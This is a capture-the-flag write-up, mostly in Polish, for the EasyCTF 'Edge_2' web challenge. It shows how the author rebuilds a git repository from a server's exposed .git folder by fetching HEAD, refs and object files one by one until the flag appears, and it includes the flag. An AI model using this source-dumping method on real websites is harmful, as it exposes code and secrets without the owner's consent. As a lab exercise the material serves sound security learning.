## Edge_2 [WEB 200]

>Last time we screwed up. But we've learned our lesson.
>
>http://edge2.web.easyctf.com/ (page no longer available)


### EN / [PL](#rozwiązanie)

### Solution:

### [EN](#solution) / PL

### Rozwiązanie:

Po sprawdzeniu adresu `http://edge2.web.easyctf.com/.git/` widać, że git nadal tam jest, nie ma tylko dostępu.

```
Forbidden

You don't have permission to access /.git/ on this server.
```

Ale do konkretnego pliku w gicie dostęp już jest `http://edge2.web.easyctf.com/.git/HEAD`

```
ref: refs/heads/master
```

Utworzyłem więc nowe repozytorium gita.

```
$ git init
Initialized empty Git repository in /.../.git/
$ ls -a
.  ..  edge2  .git
$ cd .git
$ ls -a
.  ..  branches  config  description  HEAD  hooks  info  objects  refs
```

I napisałem skrypt, który kopiuje z `edge2` pliki i zapisuje je w moim nowym repo.
[tree.py](tree.py) tworzy listę plików z pustego repozytorium, uzupełnia ją o kilka istotnych plików, które mogłyby być na `edge2` i dla każdego wykonuje zapytanie za pomocą `curl`.

```
$ ls -a
.   branches        config       HEAD   index  objects      refs
..  COMMIT_EDITMSG  description  hooks  info   packed-refs
$ git show
fatal: bad object HEAD
```

Nie będzie to jednak jeszcze działać, gdyż katalog `objects` jest póki co pusty.

```
$ cat HEAD
ref: refs/heads/master
$ cat refs/heads/master
a48ee6d6ca840b9130fbaa73bbf55e9e730e4cfd
```

W pliku `HEAD` znajduje się referencja do bieżącej gałęzi, w tym przypadku `master`.
Z kolei w pliku `refs/heads/master` jest przechowywana referencja do ostatniego commita. `a48ee6d6ca840b9130fbaa73bbf55e9e730e4cfd` oznacza, że w katalogu `objects` powinien istnieć katalog `a4`, a w nim plik `8ee6d6ca840b9130fbaa73bbf55e9e730e4cfd`.

[request.py](request.py) to prosty skrypt pobierający z `edge2` zadane commity.

Dalej uzupełniłem moje repo o kilka brakujących elementów.

```
.git$ python3 request.py a48ee6d6ca840b9130fbaa73bbf55e9e730e4cfd
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   169  100   169    0     0    585      0 --:--:-- --:--:-- --:--:--   586
.git$ cd objects/
.git/objects$ ls
a4  info  pack
.git/objects$ cd a4/
.git/objects/a4$ ls -a
.  ..  8ee6d6ca840b9130fbaa73bbf55e9e730e4cfd
.git/objects/a4$ git show
error: Could not read 6b4131bb3b84e9446218359414d636bda782d097
fatal: unable to parse commit 6b4131bb3b84e9446218359414d636bda782d097
```

Dostałem nazwę kolejnego brakującego commita. I tak do skutku :-)

W [log](log) znajduje się zapis ściągnięcia większości repo, aż do odkrycia flagi.

`easyctf{hiding_the_problem_doesn't_mean_it's_gone!}`.
